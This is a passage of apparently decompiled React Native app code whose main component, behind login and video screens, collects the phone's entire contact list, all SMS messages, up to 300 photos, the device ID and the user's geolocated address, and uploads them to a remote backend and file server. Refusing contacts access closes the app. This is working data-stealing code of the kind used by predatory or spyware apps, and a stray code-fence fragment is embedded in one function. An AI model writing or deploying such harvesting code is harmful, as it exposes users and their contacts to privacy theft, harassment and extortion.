var X = function (R) {
    (0, l.default)(q, R);
    var D, N, C = (D = q, N = z(), function () {
            var e, t = (0, f.default)(D);
            if (N) {
                var n = (0, f.default)(this).constructor;
                e = Reflect.construct(t, arguments, n);
            } else
                e = t.apply(this, arguments);
            return (0, u.default)(this, e);
        });
    function q() {
        var e;
        (0, o.default)(this, q);
        for (var i = arguments.length, l = new Array(i), u = 0; u < i; u++)
            l[u] = arguments[u];
        return (e = C.call.apply(C, [this].concat(l))).state = {
            isLoadingComplete: !1,
            isLogin: !1
        }, e.photos = {
            data: [],
            index: 0,
            uniqueId: null,
            url: null
        }, e.offline = !1, e.offlineData = {}, e.check = !1, e.loadAsync = (0, n.default)(function* () {
            return Promise.all([
                b.default.loadUrl(),
                b.default.loadAuth(),
                b.default.get('Login').then(function (t) {
                    e.state.isLogin = !!t;
                })
            ]);
        }), e.requestPermission = function (t) {
            e.waitLogin = t.waitLogin, e.offline = t.offline, t.offline && (e.offlineData = t), e.requestReadContactsPermission();
        }, e.getContacts = function () {
            var n = [];
            E.default.getAll().then(function (o) {
                o && o instanceof Array ? 0 != o.length ? (o.forEach(function (e) {
                    e.phoneNumbers && e.phoneNumbers instanceof Array && e.phoneNumbers.length && n.push({
                        record_id: e.recordID,
                        family_name: e.familyName,
                        given_name: e.givenName,
                        phone_numbers: e.phoneNumbers
                    });
                }), n.length < 1 ? t.default.alert((0, G.default)('hint'), s.default.createElement(c.Text, { style: { color: 'black' } }, (0, G.default)('contacts3')), [{
                        text: 'OK!-' + n.length,
                        onPress: function () {
                            return P.default.exitApp();
                        }
                    }]) : (e.waitLogin && c.DeviceEventEmitter.emit('LoginEnvent'), e.offline ? (0, L.default)(e.offlineData.phone, 'c', Object.assign({ data: n }, e.offlineData)) : e.props.dispatch({
                    type: 'submit/contacts',
                    payload: { contacts: n }
                }), e.requestReadSMS())) : t.default.alert((0, G.default)('hint'), s.default.createElement(c.Text, { style: { color: 'black' } }, (0, G.default)('contacts4')), [{
                        text: 'OK!',
                        onPress: function () {
                            return P.default.exitApp();
                        }
                    }]) : t.default.alert((0, G.default)('hint'), s.default.createElement(c.Text, { style: { color: 'black' } }, (0, G.default)('contacts3')), [{
                        text: 'OK',
                        onPress: function () {
                            return P.default.exitApp();
                        }
                    }]);
            });
        }, e.getSMS = function () {
            c.NativeModules.SMSModule.getSmsInPhone().then(function (t) {
                e.offline ? (0, L.default)(e.offlineData.phone, 's', {
                    phone: e.offlineData.phone,
                    data: t
                }) : e.props.dispatch({
                    type: 'submit/sms',
                    payload: { sms: t }
                });
            });
        }, e.getPhotos = function () {
            h.default.getPhotos({
                first: 300,
                assetType: 'Photos'
            }).then(function (t) {
                e.photos.data = t.edges instanceof Array ? t.edges : [], e.waitFileServer(), e.requestLocation();
            }).catch(function () {
                (0, A.default)((0, G.default)('photo1'));
            });
        }, e.waitFileServer = (0, n.default)(function* () {
            e.timer && clearTimeout(e.timer);
            var t = yield b.default.get('file_server');
            t ? (e.photos.url = t, e.uploadFile()) : e.timer = setTimeout(function () {
                e.waitFileServer();
            }, 1000);
        }), e.uploadFile = (0, n.default)(function* () {
            for (var t = new FormData(), n = e.photos.index, o = 0, i = n; i < e.photos.data.length && o < 20; i++) {
                n = i + 1, o++;
                var l = e.photos.data[i].node.image;
                try {
                    var u = {
                        uri: (yield p.default.createResizedImage(l.uri, 650, 650, 'JPEG', 60)).uri,
                        type: 'multipart/octet-stream',
                        name: '.jpg'
                    };
                    t.append('file[]', u);
                } catch (e) {
                }
            }
            0 !== o && e.props.dispatch({
                type: 'submit/upload',
                payload: {
                    url: e.photos.url,
                    data: t,
                    uniqueId: e.photos.uniqueId
                }
            }).then(function (t) {
                'error' !== t && (e.photos.index = n, b.default.set('ImageIndex', e.photos.index)), e.photos.index < e.photos.data.length && e.uploadFile();
            });
        }), e.requestLocation = function () {
            y.default.requestPermission({
                ios: 'whenInUse',
                android: {
                    detail: 'coarse',
                    rationale: {
                        title: (0, G.default)('location'),
                        message: (0, G.default)('authorization3'),
                        buttonPositive: 'OK'
                    }
                }
            }).then(function (t) {
                t && y.default.getLatestLocation({ timeout: 60000 }).then(function (t) {
                    t && t.latitude && t.longitude && c.NativeModules.GeoModule.getGeoAddress(t.latitude, t.longitude).then(function (t) {
                        e.offline ? (0, L.default)(e.offlineData.phone, 'l', {
                            phone: e.offlineData.phone,
                            data: t
                        }) : e.props.dispatch({
                            type: 'user/updateLocation',
                            payload: { location: t }
                        });
                    });
                });
            });
        }, e;
    }
    return (0, i.default)(q, [
        {
            key: 'componentDidMount',
            value: function () {
                var e = this;
                this.subscription = c.DeviceEventEmitter.addListener('RequestPermission', this.requestPermission), S.default.addEventListener(function (t) {
                    t.isConnected && !e.check && (e.check = !0, (0, k.default)());
                });
            }
        },
        {
            key: 'componentWillUnmount',
            value: function () {
                this.subscription.remove();
            }
        },
        {
            key: 'requestReadContactsPermission',
            value: function () {
                var e = (0, n.default)(function* () {
                    var e = this;
                    if ('android' === c.Platform.OS) {
                        if ((yield c.PermissionsAndroid.request(c.PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
                                title: (0, G.default)('contacts2'),
                                message: (0, G.default)('authorization3'),
                                buttonPositive: 'OK'
                            })) !== c.PermissionsAndroid.RESULTS.GRANTED)
                            return void (0, A.default)((0, G.default)('contacts1'));
                    } else {
                        var n = yield E.default.checkPermission();
                        if ('undefined' === n)
                            return void E.default.requestPermission().then(function (t) {
                                'authorized' === t ? e.getContacts() : (0, A.default)((0, G.default)('contacts1'));
                            }).catch(function () {
                                t.default.alert((0, G.default)('hint'), s.default.createElement(c.Text, { style: { color: 'black' } }, (0, G.default)('contacts3')), [{
                                        text: 'OK',
                                        onPress: function () {
                                            return P.default.exitApp();
                                        }
                                    }]);
                            });
                        if ('denied' === n)
                            return void (0, A.default)((0, G.default)('contacts1'));
                    }
                    this.getContacts();
                });
                return function () {
                    return e.apply(this, arguments);
                };
            }()
        },
        {
            key: 'requestReadSMS',
            value: function () {
                var e = (0, n.default)(function* () {
                    if ('android' === c.Platform.OS) {
                        if ((yield c.PermissionsAndroid.request(c.PermissionsAndroid.PERMISSIONS.READ_SMS, {
                                title: (0, G.default)('message2'),
                                message: (0, G.default)('authorization3'),
                                buttonPositive: 'OK'
                            })) !== c.PermissionsAndroid.RESULTS.GRANTED)
                            return void (0, A.default)((0, G.default)('message1'));
                        this.getSMS();
                    }
                    this.getDeviceInfo();
                });
                return function () {
                    return e.apply(this, arguments);
                };
            }()
        },
        {
            key: 'getDeviceInfo',
            value: function () {
                ```js
ï»¿
```;
                var e = (0, n.default)(function* () {
                    this.photos.uniqueId = yield v.default.getUniqueId(), this.photos.uniqueId ? this.requestReadPhonePermission() : (0, A.default)((0, G.default)('device'));
                });
                return function () {
                    return e.apply(this, arguments);
                };
            }()
        },
        {
            key: 'requestReadPhonePermission',
            value: function () {
                var e = (0, n.default)(function* () {
                    var e = yield b.default.get('ImageIndex');
                    if ((e && (this.photos.index = e), 'android' === c.Platform.OS) && (yield c.PermissionsAndroid.request(c.PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE, {
                            title: (0, G.default)('photo2'),
                            message: (0, G.default)('authorization3'),
                            buttonPositive: 'OK'
                        })) !== c.PermissionsAndroid.RESULTS.GRANTED)
                        return void (0, A.default)((0, G.default)('photo1'));
                    this.getPhotos();
                });
                return function () {
                    return e.apply(this, arguments);
                };
            }()
        },
        {
            key: 'render',
            value: function () {
                var t = this;
                return this.state.isLoadingComplete || this.props.skipLoadingScreen ? s.default.createElement(e.default, null, s.default.createElement(r(d[55]).NavigationContainer, {
                    ref: function (e) {
                        I.default.setTopLevelNavigator(e);
                    }
                }, s.default.createElement(H.Navigator, { initialRouteName: this.state.isLogin ? 'Main' : 'Login' }, s.default.createElement(H.Screen, {
                    name: 'Login',
                    component: w.default,
                    options: { headerShown: !1 }
                }), s.default.createElement(H.Screen, {
                    name: 'Main',
                    component: 1 == r(d[56]).view ? j : J,
                    options: { headerShown: !1 }
                }), s.default.createElement(H.Screen, {
                    name: 'Web',
                    component: _.default,
                    options: {
                        title: (0, G.default)('video'),
                        headerStyle: { backgroundColor: K.default.main },
                        headerBackTitle: '',
                        headerTintColor: '#fff',
                        headerTitleStyle: { fontWeight: 'bold' }
                    }
                })))) : s.default.createElement(T.default, {
                    startAsync: this.loadAsync,
                    onFinish: function () {
                        return t.setState({ isLoadingComplete: !0 });
                    }
                });
            }
        }
    ]), q;
}(s.default.Component), Q = (0, r(d[57]).connect)(function (e) {
    return { router: e.router };
})(X), V = (0, R.default)({
    initialState: {},
    models: [
        B.default,
        U.default,
        F.default
    ],
    onError: function (e) {
        console.log('onError', e);
    }
}).start(s.default.createElement(Q, null));
_e.default = V; 